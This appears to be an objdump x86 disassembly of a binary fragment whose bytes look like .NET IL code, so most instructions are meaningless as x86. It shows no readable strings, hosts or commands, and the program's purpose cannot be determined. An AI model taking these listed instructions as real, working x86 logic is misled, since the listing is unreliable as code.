  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 7a       	add    $0x7a720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 82 21       	and    $0x21827216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 ec    	or     -0x138de7db(%edx),%ah
  4031e4:	21 00                	and    %eax,(%eax)
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 fe    	or     -0x18de5db(%edx),%ah
  4031f5:	21 00                	and    %eax,(%eax)
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 12             	or     0x12(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 70             	or     0x70(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 70             	or     0x70(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 74                	jb     0x403337
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 7e             	or     %esi,0x7e(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 92                	jb     0x403278
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 b2                	jb     0x4032a4
  4032f2:	22 00                	and    (%eax),%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 70             	or     0x70(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 c8                	jb     0x4032d6
  40330e:	22 00                	and    (%eax),%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 d0                	jb     0x4032f4
  403324:	22 00                	and    (%eax),%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 dc                	jb     0x40330c
  403330:	22 00                	and    (%eax),%al
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 ec                	jb     0x403459
  40346d:	22 00                	and    (%eax),%al
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 f2             	adc    %esi,-0xe(%edx)
  4034ae:	22 00                	and    (%eax),%al
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 38 23    	or     0x23387209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	52                   	push   %edx
  4034ec:	23 00                	and    (%eax),%eax
  4034ee:	70 28                	jo     0x403518
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 7e             	or     %esi,0x7e(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 8a             	or     -0x76(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	9a 23 00 70 6f 7e 00 	lcall  $0x7e,$0x6f700023
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 7e                	jb     0x4035af
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 a8             	or     -0x58(%edx),%dh
  403540:	23 00                	and    (%eax),%eax
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 be             	adc    %esi,-0x42(%edx)
  40362e:	23 00                	and    (%eax),%eax
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
